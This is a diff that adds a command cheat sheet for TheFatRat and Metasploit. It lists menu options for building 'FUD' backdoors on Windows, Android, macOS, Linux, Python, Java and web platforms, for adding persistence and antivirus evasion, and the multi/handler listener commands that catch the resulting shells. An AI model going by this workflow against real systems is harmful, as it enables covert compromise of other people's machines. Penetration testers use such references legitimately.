@@ -1,0 +1,67 @@
+[X] TheFatRat Command List
+
+[\] sudo ./setup.sh
+[/] Install dependencies and configure TheFatRat
+
+[\] sudo fatrat
+[/] Launch TheFatRat main menu
+
+[\] 1
+[/] Create FUD backdoor (authorized testing only)
+
+[\] 2
+[/] Create payload with msfvenom
+
+[\] 3
+[/] Create backdoor using PwnWinds
+
+[\] 4
+[/] Create backdoor using TheFatRat’s own encoder
+
+[\] 5
+[/] Create backdoor for Android (APK)
+
+[\] 6
+[/] Create backdoor for Mac OS X
+
+[\] 7
+[/] Create backdoor for Linux
+
+[\] 8
+[/] Create backdoor for Python
+
+[\] 9
+[/] Create backdoor for Java
+
+[\] 10
+[/] Create backdoor for Web Payloads (PHP, ASP, JSP)
+
+[\] 11
+[/] Enable persistence options
+
+[\] 12
+[/] Enable AV‑evasion options
+
+[\] msfconsole
+[/] Start Metasploit listener for generated payloads
+
+[\] use exploit/multi/handler
+[/] Load Metasploit handler
+
+[\] set payload <payload>
+[/] Set payload type
+
+[\] set LHOST <ip>
+[/] Set listener IP
+
+[\] set LPORT <port>
+[/] Set listener port
+
+[\] exploit
+[/] Start listener
+
+[\] sudo fatrat --update
+[/] Update TheFatRat
+
+[\] sudo fatrat --fix
+[/] Fix common dependency issues
